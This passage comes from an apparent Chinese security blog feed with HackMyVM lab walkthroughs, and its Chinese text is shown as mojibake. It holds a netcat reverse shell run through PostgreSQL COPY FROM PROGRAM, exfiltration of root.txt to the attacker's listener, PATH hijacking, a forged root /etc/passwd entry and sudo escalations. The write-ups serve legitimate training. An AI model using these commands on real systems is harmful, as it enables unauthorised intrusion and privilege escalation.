<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325105700.png"   style="zoom:50%;" >

<p>å¾—åˆ°ä¸€æ‰¹urlå’Œè´¦å·å¯†ç ï¼Œå…ˆæŠŠurléƒ½ä¿å­˜æˆå­—å…¸ï¼Œç„¶åfuffä¸€ä¸‹</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325110024.png"   style="zoom:50%;" >

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -c -r -u http://192.168.64.105 -H &quot;HOST: FUZZ&quot;  -w url.txt</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-25%2011.01.44.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>å¯ä»¥çœ‹åˆ°party.bah.hmvæ¯”è¾ƒä¸ä¸€æ ·ï¼Œé…ç½®ä¸€ä¸ªhostsæ–‡ä»¶ç„¶åè®¿é—®ï¼Œæ˜¯ä¸€ä¸ªç½‘é¡µç‰ˆç»ˆç«¯ï¼Œç”¨ä¹‹å‰æ‹¿åˆ°çš„ymlæ–‡ä»¶é‡Œé¢çš„è´¦å·å¯†ç ç™»é™†ï¼ŒæŸ¥çœ‹&#x2F;etc&#x2F;passwdï¼Œå‘ç°æœ‰ä¸ªrocioç”¨æˆ·ï¼Œå‰é¢æ•°æ®åº“æŸ¥è¯¢ä¸­æœ‰æ‹¿åˆ°ä»–çš„å¯†ç ï¼Œç›´æ¥åˆ‡æ¢ç”¨æˆ·</p>
<p>åšäº†ä¸€äº›å¸¸è§„çš„æœå¯»ï¼Œæ²¡æ‰¾åˆ°æ€ä¹ˆææƒæ–¹å¼ï¼Œä¸‹è½½ä¸€ä¸ªpspy64çœ‹çœ‹ï¼Œå‘ç°</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111440.png" ></p>
<p>è¿™æ˜¯å¯åŠ¨ Shell In A Box æœåŠ¡ï¼Œé‡ç‚¹æ˜¯æœ€åçš„â€œ**-s &#x2F;devel:root:root:&#x2F;:&#x2F;tmp&#x2F;dev**â€ï¼ŒæŒ‡å®šäº†å¦ä¸€ä¸ªè·¯å¾„ <code>/devel</code>ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ä¼šç›´æ¥ä»¥ root ç”¨æˆ·èº«ä»½è¿›å…¥ <code>/tmp/dev</code> ç›®å½•ï¼Œè€Œä¸”æ˜¯ä»¥rootæ‰§è¡Œã€‚</p>
<p>æ‰€ä»¥æ€è·¯æ˜¯æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª&#x2F;tmp&#x2F;devï¼Œç„¶ååœ¨ç½‘é¡µç«¯è®¿é—®&#x2F;develå»æ‰§è¡Œ&#x2F;tmp&#x2F;dev</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111819.png" ></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æœ¬åœ°å¼€å¯ç›‘å¬ï¼Œç„¶åå»è®¿é—®&#x2F;devel</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325111914.png" ></p>
<p>ææƒæˆåŠŸ</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å­¦ä¹ äº†hostçš„fuzzï¼Œæœ€åshellboxçš„è¯­å¥ï¼Œè¦æŸ¥é˜…èµ„æ–™æ‰èƒ½è¯»æ‡‚ï¼Œå¾ˆæœ‰è¶£ã€‚</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>å¤ç›˜</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm governmentå¤ç›˜</title>
    <url>/2024/06/20/hackmyvm-government%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>nmapæ‰«ç«¯å£æ‰«åˆ°21ã€22ã€80ï¼Œå…ˆçœ‹21ç«¯å£</p>
<p>lftpè¿æ¥å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢éƒ½æ˜¯ä¸€äº›txt</p>
<p>æœ‰çœ‹åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼ˆå¯¹åç»­æœ‰ç‚¹ç”¨ï¼‰</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620194452.png"   style="zoom:50%;" >

<p>è¿˜æœ‰è¿™ä¸¤ä¸ªä¸ªæ–‡ä»¶ï¼Œæ˜¯ä¸€äº›md5åŠ å¯†åçš„æ•°æ®ï¼ˆéƒ½èƒ½è§£å¼€ï¼‰ï¼Œè¿˜æœ‰å‡ ä¸ªç”¨æˆ·åï¼Œä¿å­˜ä¸‹æ¥hydraçˆ†ç ´sshå¤±è´¥</p>
<p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„txtï¼Œä¸çŸ¥é“èƒ½å¹²å˜›</p>
<p>è½¬å‘80ç«¯å£ï¼Œæ‰«ç›®å½•æœ‰ä¸å°‘ä¸œè¥¿</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195058.png" ></p>
<p>æœ€å¼€å§‹çœ‹äº†ä¸€ä¸‹&#x2F;blogä¸‹é¢çš„ï¼Œçœ‹ä¸å‡ºä»€ä¹ˆcmsï¼Œä¹Ÿæ²¡ä»€ä¹ˆåŠŸèƒ½çš„ï¼Œç›®å½•å€’æ˜¯å¾ˆå¼€æ”¾ï¼ˆæ²¡ä»€ä¹ˆç”¨</p>
<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>åæ¥çœ‹äº†phppgadminï¼Œæ˜¯ä¸ªæ•°æ®åº“ç®¡ç†ç•Œé¢</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195222.png" ></p>
<p>æœ‰ä¸ªç™»å½•å£ï¼Œå°è¯•ä½¿ç”¨ postgres:admin å¼±å£ä»¤ç™»å½•ï¼ˆè¿™ä¸ªç”¨æˆ·åæœ‰ç‚¹æ²¡æƒ³åˆ°ï¼‰ï¼Œç™»å½•æˆåŠŸï¼ŒæŸ¥æ‰¾ç›¸å…³çš„æ¼æ´</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195343.png" ></p>
<p>ç›´æ¥å¯ä»¥åå¼¹shelläº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;nc -e /bin/bash 192.168.64.3 1234&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195510.png" ></p>
<p>æ³¨æ„é‚£ä¸ªPaginate resultsä¸ç”¨å‹¾é€‰ï¼Œç„¶åæˆåŠŸåå¼¹åˆ°shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195628.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>å¯»æ‰¾äº†å¾ˆä¹…ï¼Œå‘ç°åœ¨&#x2F;var&#x2F;logä¸‹æœ‰ä¸ª.creds.log</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195807.png" ></p>
<p>ç»“åˆå‰é¢ftpçœ‹åˆ°çš„ä¿¡æ¯ï¼Œå¯ä»¥çŸ¥é“æ˜¯BlowfishåŠ å¯†ï¼Œkeyå’ŒIVéƒ½ç»™å‡ºæ¥äº†ï¼Œç”¨å·¥å…·è§£å¯†å³å¯</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620195936.png" ></p>
<p>æ‹¿åˆ°ä¸€ä¸²å¯†é’¥ï¼Œç™»å½•erikç”¨æˆ·ï¼Œèƒ½å¤Ÿæ‹¿åˆ°user.txt</p>
<p>æŸ¥æ‰¾suidææƒ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200131.png" ></p>
<p>å‘ç°&#x2F;home&#x2F;erik&#x2F;backups&#x2F;nuclearä¸‹æœ‰ä¸ªremoveï¼Œç”¨stringsçœ‹ä¸€ä¸‹å¤§æ¦‚æ˜¯å¹²å˜›çš„</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-20%2020.06.32.png" ></p>
<p>å¯ä»¥çŸ¥é“æ‰§è¡Œäº†timeå‘½ä»¤ï¼Œæ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯ç¯å¢ƒå˜é‡åŠ«æŒäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;/bin/bash -p&#x27;&gt;/tmp/time</span><br><span class="line">chmod +x /tmp/time</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./remove a</span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240620200824.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å‰é¢ftpå’Œ80ç«¯å£çš„&#x2F;blogå¤ªè¿·æƒ‘äººï¼Œè¿˜æœ‰å°±æ˜¯æ‰¾åˆ°.creds.logè¦ç»†å¿ƒï¼Œå…¶ä»–åœ°æ–¹éƒ½è¿˜å¥½ã€‚</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm å¤ç›˜åˆé›†1</title>
    <url>/2024/03/16/hackmyvm%E5%A4%8D%E7%9B%98%E5%90%88%E9%9B%861/</url>
    <content><![CDATA[<h3 id="translator"><a href="#translator" class="headerlink" title="translator"></a>translator</h3><p>æ¥åˆ°80ç«¯å£çœ‹åˆ°æœ‰ä¸ªtranslatorçš„ç•Œé¢ï¼Œéšä¾¿è¾“äº†abcï¼Œè¿”å›zyxï¼Œè¯•äº†å‡ æ¬¡ç¡®è®¤åŠ å¯†é€»è¾‘å°±æ˜¯ä¸€å¯¹ä¸€æ›¿æ¢ï¼Œa-zï¼Œb-yè¿™æ ·ï¼Œä½†æ˜¯æ•°å­—å’Œå¤§å†™å­—æ¯æ˜¯ä¸ä¼šå˜çš„ï¼Œæ‰«äº†ç›®å½•ä¹Ÿæ²¡çœ‹åˆ°æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.15.54.png" ></p>
<p>ç„¶åçœ‹äº†wpæ‰çŸ¥é“ï¼Œ<strong>è¿™ä¸ªè¾“å…¥æ¡†å¯ä»¥å‘½ä»¤æ³¨å…¥ï¼Œè¦å…ˆæœ‰ä¸ªåˆ†å·éš”æ–­ï¼Œå¹¶ä¸”è¦è¾“å…¥çš„å‘½ä»¤è¦å…ˆtransalteä¸€ä¸‹</strong>ï¼ˆæœ‰ç‚¹è§£è°œï¼‰ï¼Œæ¯”å¦‚è¦ä½¿ç”¨idå‘½ä»¤ï¼Œå°±è¦è¾“å…¥â€œï¼›rwâ€</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-16%2018.22.42.png"   alt="åƒè¿™æ ·" style="zoom:50%;" >

<p>é‚£å°±å…ˆncæ‹¿åˆ°ä¸€ä¸ªshellï¼Œä¸»è¦è¦å…ˆæŠŠå‘½ä»¤translateä¸€ä¸‹</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316182706.png"   style="zoom:50%;" >

<p>å°±æ‹¿åˆ°ç¬¬ä¸€ä¸ªshellï¼Œæˆ‘æ„Ÿè§‰æœ‰ç‚¹è„‘æ´ï¼Œå¯èƒ½æ˜¯è§è¯†çš„ä¸å¤Ÿå¤šå§ï¼Œä»£ç é€»è¾‘å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test = $_GET[&#x27;hmv&#x27;];</span><br><span class="line">$test = escapeshellcmd($test);// åº”è¯¥æ˜¯ç”¨æ¥é˜²æ­¢å‘½ä»¤æ³¨å…¥çš„ï¼Œè¾“å…¥åˆ†å·åå‰é¢è·Ÿäº†ä¸€ä¸ª\ï¼Œä½†æ˜¯ç»è¿‡ä¸‹é¢ç¬¬ä¸€ä¸ªsystemæ–œæ†åˆæ²¡äº†</span><br><span class="line">echo (&quot;Translated to:&quot;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$ultima_linea = system(&#x27;echo &#x27;.$test.&#x27;| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba&#x27;);</span><br><span class="line">$ulti = system(&#x27;echo &#x27;.$ultima_linea.&#x27;| tr &quot;php&quot; &quot;wtf&quot;&#x27;); // ç”¨åˆ†å·å®ç°å‘½ä»¤æ³¨å…¥</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨htmlç›®å½•ä¸‹æœ‰ä¸ªhvxingæ–‡ä»¶ï¼Œæ‰“å¼€æŸ¥çœ‹æ˜¯æ®µå­—ç¬¦ä¸²ï¼Œç¬¬ä¸€ååº”æ˜¯æ‹¿å»ç½‘é¡µtranslateä¸€ä¸‹</p>
<p>ç„¶åå°±æ‹¿åˆ°ä¸€ä¸ªå¯†ç ï¼Œåˆ°&#x2F;homeç›®å½•ä¸‹çœ‹åˆ°æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œå°è¯•äº†ä¸€ä¸‹oceanç™»é™†æˆåŠŸ</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185134.png"   style="zoom:50%;" >

<p>ç„¶åsudo -lçœ‹åˆ°æœ‰choomå¯ä»¥åˆ©ç”¨ï¼Œindiaå¯ä»¥ä¸ç”¨å¯†ç ï¼ŒgtfobinsæŸ¥è¯¢åˆ°äº†ææƒå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u india /usr/bin/choom -n 0 /bin/sh</span><br></pre></td></tr></table></figure>

<h4 id="ç¬¬äºŒä¸ªflag"><a href="#ç¬¬äºŒä¸ªflag" class="headerlink" title="ç¬¬äºŒä¸ªflag"></a>ç¬¬äºŒä¸ªflag</h4><p>å°±åˆ‡æ¢åˆ°äº†indiaè´¦æˆ·ï¼Œå†sudo -læŸ¥æ‰¾ï¼Œæœ‰ä¸€ä¸ªtranså¯ä»¥åˆ©ç”¨ï¼Œfileçœ‹äº†ä¸€ä¸‹æ˜¯ä¸ªæ˜¯ä¸ªshellçš„è„šæœ¬</p>
<p>catçœ‹äº†ä¸€ä¸‹å†…å®¹å¾ˆå¤šï¼Œåˆ‡æ¢ä¸ªæ€è·¯-hçœ‹çœ‹å¸®åŠ©æ–‡æ¡£</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185857.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316185917.png"   style="zoom:50%;" >

<p>æ³¨æ„åˆ°æœ‰input fileä¹Ÿå¯ä»¥å¼€ä¸ªhttpä»£ç†ï¼Œé‚£å°±å°è¯•ç»“åˆè¿™ä¸¤ä¸ªåŠŸèƒ½æŠŠ&#x2F;root&#x2F;root.txtè¯»å‡ºæ¥</p>
<p>kaliå…ˆå¼€ä¸ªnc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo trans -i /root/root.txt -x 192.168.64.3:8888</span><br><span class="line">nc -lvp 8888 &gt; trans</span><br></pre></td></tr></table></figure>

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316190434.png"   style="zoom:50%;" >

<p>å¾—åˆ°ä¸€ä¸ªåŒ…ï¼Œå°è¯•äº†ä¸€ä¸‹urlè§£ç qåé¢çš„å†…å®¹ï¼Œå°±æ‹¿åˆ°flag</p>
<h4 id="ææƒæ€è·¯"><a href="#ææƒæ€è·¯" class="headerlink" title="ææƒæ€è·¯"></a>ææƒæ€è·¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512</span><br></pre></td></tr></table></figure>

<p>å…ˆç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå­—ç¬¦ä¸²ï¼Œç„¶åæ‹¼æ¥ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">but:$6$qzFU83LRKpBUmZCQ$qCQiwtXEjJmtTAOO2HRJsneHiliw9k2V2/3EtU64v9tP2eaud5fdtp5pQurFVtEsovQjfbo2j3KY.JmF0QqEL/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>å…ˆå¤åˆ¶ä¸€ä»½åŸæ¥çš„&#x2F;etc&#x2F;passwdï¼Œåœ¨&#x2F;tmpç›®å½•ä¸‹ä¼ªé€ ä¸€ä¸ªä¸€æ ·çš„æœ€ä¸‹é¢åœ¨åŠ å…¥æˆ‘ä»¬ä¼ªé€ çš„å­—ç¬¦ä¸²ï¼Œ<strong>æ€è·¯å°±ç»™é¶æœºå¤šåŠ ä¸€ä¸ªç”¨æˆ·ï¼Œæœ‰rootæƒé™</strong>ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root trans -i www -o /etc/passwd -no-auto</span><br></pre></td></tr></table></figure>

<p>å†™å…¥ä¹‹åç™»é™†æˆ‘ä»¬ä¼ªé€ çš„ç”¨æˆ·ï¼ŒæˆåŠŸææƒåˆ°root</p>
<h5 id="å°æŠ½è±¡"><a href="#å°æŠ½è±¡" class="headerlink" title="å°æŠ½è±¡"></a>å°æŠ½è±¡</h5><p>å°±æ˜¯åˆ©ç”¨è¯»å†™åŠŸèƒ½è·å–æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼Œä¹Ÿå¯ä»¥å¯¹å…³é”®æ–‡ä»¶è¿›è¡Œç¯¡æ”¹</p>
<h3 id="teacher"><a href="#teacher" class="headerlink" title="teacher"></a>teacher</h3><p>webç«¯æ‰«æç›®å½•æ‰«åˆ°ï¼Œaccess.php,log.phpï¼Œclearlog.phpï¼Œçœ‹ä¸€ä¸‹log.phpï¼Œå†…å®¹è¯´æœ‰ä¸€ä¸ªrabbit.jpgï¼Œè®¿é—®ä¹‹åä¸€å¼ Â·å›¾ç‰‡Â·ï¼Œæœ€å¼€å§‹ç”¨stegseekå‡ºäº†å¾—åˆ°ä¸€ä¸ªsecret.txté‡Œé¢å†™ç€â€rabbitholeâ€ï¼Œä¸æ˜æ‰€ä»¥ï¼Œå°è¯•ç™»é™†sshä¹Ÿæ²¡æœ‰ç”¨</p>
<p>å»åˆ°access.jpgï¼Œæºä»£ç srcåé¢æ˜¯ç©ºçš„ï¼Œå°±è”æƒ³åˆ°æœ‰æ²¡æœ‰å¯ä»¥å†™å…¥çš„å‚æ•°ï¼Œfuzzäº†ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200751.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -u &#x27;http://192.168.64.77/access.php?FUZZ=rabbit.jpg&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=12</span><br></pre></td></tr></table></figure>

<p>æœç„¶å¾—åˆ°äº†ä¸€ä¸ªå‚æ•°â€˜idâ€™ï¼Œç„¶åçœ‹åˆ°äº†å›¾ç‰‡</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200944.png" ></p>
<p>å†çœ‹çœ‹è¿™æ—¶çš„æºç ï¼Œç„¶åå°±è”æƒ³åˆ°å‘½ä»¤æ³¨å…¥ï¼Œå…ˆé—­åˆå•å¼•å·ï¼Œåœ¨å†™å…¥å‘½ä»¤è¯•è¯•</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201116.png" ></p>
<p>ç»è¿‡ä¸€ç•ªæ¢ç´¢ï¼ˆç»“åˆwpï¼‰ï¼Œå‘ç°å¯ä»¥ç›´æ¥æ³¨å…¥phpè¯­å¥ï¼Œè¿˜è¦é…åˆå‰é¢çš„log.phpï¼Œå› ä¸ºaccess.phpä¸ä¼šæ‰§è¡Œï¼Œlog.phpè®°å½•äº†è¿™äº›å¹¶ä¸”ä¼šæ‰§è¡Œï¼Œä¾‹å¦‚ï¼š</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201809.png" ></p>
<p>å‘ç°äº†åˆ©ç”¨ç‚¹ï¼Œé‚£å°±æ‹¿åˆ°ç¬¬ä¸€ä¸ªshelläº†ï¼Œåœ¨htmlç›®å½•ä¸‹å‘ç°æœ‰ä¸ªpdfï¼Œä¸‹è½½æŸ¥çœ‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202025.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316202055.png" ></p>
<p>è™½ç„¶å¯†ç è¢«ç³Šä½äº†ï¼Œä½†æ˜¯å¯ä»¥åœ¨å‰é¢æ‰¾åˆ°è‡ªå·±ï¼Œåå‘å†™å‡ºæ¥å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pass = ThankYouTeachers</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±ç™»é™†äº†mrteacherè´¦æˆ·ï¼ŒæˆåŠŸæ‹¿åˆ°userflag</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>Sudo -l çœ‹åˆ°æœ‰geditå’Œxauthå¯ä»¥åˆ©ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth</span><br></pre></td></tr></table></figure>

<p>æŸ¥äº†ä¸€ä¸‹ï¼Œ<strong>xauthå‘½ä»¤</strong> ç”¨äºæ˜¾ç¤ºå’Œç¼–è¾‘è¢«ç”¨äºè¿æ¥XæœåŠ¡å™¨çš„è®¤è¯ä¿¡æ¯ã€‚<strong>gedit</strong>æ˜¯ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨</p>
<p><strong>æ€è·¯å°±æ˜¯åˆ©ç”¨geditæŸ¥çœ‹æˆ–ä¿®æ”¹root.txtï¼ˆæˆ–å…¶ä»–ä»»æ„æ–‡ä»¶ï¼‰ï¼Œåœ¨è¿™ä¹‹å‰è¦å…ˆåˆ©ç”¨xauthå¢åŠ ä¸€ä¸ªè®¤è¯ï¼Œå¹¶ä¸”sshç™»é™†è´¦å·è¦åŠ -xè®©SSH å®¢æˆ·ç«¯ä¼šåœ¨è¿æ¥è¿‡ç¨‹ä¸­å¯ç”¨ X11 è½¬å‘ã€‚</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ ssh -X mrteacher@192.168.64.77</span><br><span class="line">mrteacher@192.168.64.77&#x27;s password: </span><br><span class="line">Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sat Mar 16 13:25:36 2024 from 192.168.64.3</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth list  åˆ—å‡ºå½“å‰ç”¨æˆ·çš„ X è®¤è¯ä¿¡æ¯</span><br><span class="line">Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10  MIT-MAGIC-COOKIE-1  5cfe7a29e891b822c5892ea140dc6706</span><br><span class="line">å‘æˆæƒæ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ª MIT-MAGIC-COOKIE-1 æƒé™</span><br></pre></td></tr></table></figure>

<p>å¢åŠ æƒé™åå°±ä½¿ç”¨geditäº†ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç›´æ¥è¯»å–rootflagï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹&#x2F;etc&#x2F;passwdå¢åŠ ä¸€ä¸ªç”¨æˆ·ææƒï¼ˆåƒä¸Šä¸€ä¸ªé¶æœºä¸€æ ·ï¼‰ï¼Œä¸¤ç§æ€è·¯éƒ½å¯ä»¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /root/root</span><br></pre></td></tr></table></figure>

<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>webç«¯å‘½ä»¤æ³¨å…¥ç»“åˆæ—¥å¿—æ–‡ä»¶ï¼Œææƒæ–¹é¢ä¸¤ä¸ªå¯åˆ©ç”¨ç‚¹çš„ç»“åˆï¼Œä¼ªé€ ç”¨æˆ·æˆ–è¯»å–æ–‡ä»¶ã€‚</p>
<h3 id="warrior"><a href="#warrior" class="headerlink" title="warrior"></a>warrior</h3><p>webç«¯æ‰«åˆ°robots.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014210.png" ></p>
<p>User.txté‡Œé¢æœ‰ä¸ªåå­—â€˜locoâ€™æˆ‘è¿˜æƒ³è¿‡çˆ†ç ´sshï¼Œæ²¡æœ‰ç»“æœï¼Œsecret.txtä¸€ä¸ªå­—ç¬¦ä¸²çœ‹èµ·æ¥ä¸æ˜¯å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317014232.png" ></p>
<p>internal.phpè¯´è¦æŠŠMACåœ°å€æ”¹æˆ00:00:00:00:00:a? æœ€åä¸€ä¸ªé—®å·è¿˜è¦ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œç½‘ä¸Šæ‰¾æ•™ç¨‹ä¿®æ”¹kaliéƒ½macåœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# ifconfig eth0 down</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# ifconfig eth0 hw ether 00:00:00:00:00:af //æœ€åè¯•å‡ºæ¥æ˜¯af</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]</span><br><span class="line">â””â”€# ifconfig eth0 up                        </span><br><span class="line">                                  </span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240317011739.png" ></p>
<p>ç„¶åå†è®¿é—®ï¼Œå°±å¾—åˆ°äº†å¯†ç ï¼Œæˆ‘å°è¯•äº†locoä½œä¸ºç”¨æˆ·åå±…ç„¶æ— æ•ˆï¼Œæœ€åçœ‹äº†wpæ‰çŸ¥é“è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·åå¯ä»¥æ˜¯broï¼ˆæ‰¶é¢è‹¦ç¬‘ï¼‰ï¼Œç„¶åé¡ºåˆ©ç™»é™†ï¼Œæƒ³è¾“å…¥sudoå›æ˜¾æ²¡æœ‰è¿™ä¸ªå‘½ä»¤ï¼Œè·¯å¾„æ²¡è®¾ç½®å¥½ï¼Œè¦è°ƒç”¨åº”è¯¥åœ¨&#x2F;usr&#x2F;sbin&#x2F;sudoï¼ŒæŸ¥åˆ°æœ‰ä¸ªtaskå¯ä»¥åˆ©ç”¨ï¼Œæ‰¾äº†ææƒè¯­å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/sbin/sudo /usr/bin/task execute /bin/sh</span><br></pre></td></tr></table></figure>

<p>é¡ºåˆ©æ‹¿åˆ°root</p>
